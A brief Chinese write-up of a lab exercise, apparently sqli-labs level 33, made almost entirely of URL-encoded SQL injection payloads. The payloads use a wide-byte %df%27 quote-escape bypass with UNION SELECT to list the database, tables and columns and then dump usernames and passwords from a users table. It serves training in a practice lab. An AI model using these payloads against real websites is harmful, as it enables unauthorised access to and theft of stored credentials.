# Less-33

第三十二关和三十三关一模一样

~~~ cmd
?id=-1%df%27%20union%20select%201,2,3--+
~~~

![Less-33-01](.\img\Less-33-01.png)



~~~ cmd
?id=-1%df%27%20union%20select%201,database(),version()--+
~~~

![Less-33-02](.\img\Less-33-02.png)



~~~ cmd
?id=-1%df%27%20union%20select%201,database(),group_concat(table_name)%20from%20information_schema.tables%20where%20table_schema=database()--+
~~~

![Less-33-03](.\img\Less-33-03.png)



~~~ cmd
?id=-1%df%27%20union%20select%201,database(),group_concat(column_name)%20from%20information_schema.columns%20where%20table_name=0x7573657273--+
~~~

![Less-33-04](.\img\Less-33-04.png)



~~~ cmd
?id=-1%df%27%20union%20select%201,database(),group_concat(username,password)%20from%20users--+
~~~

![Less-33-05](.\img\Less-33-05.png)

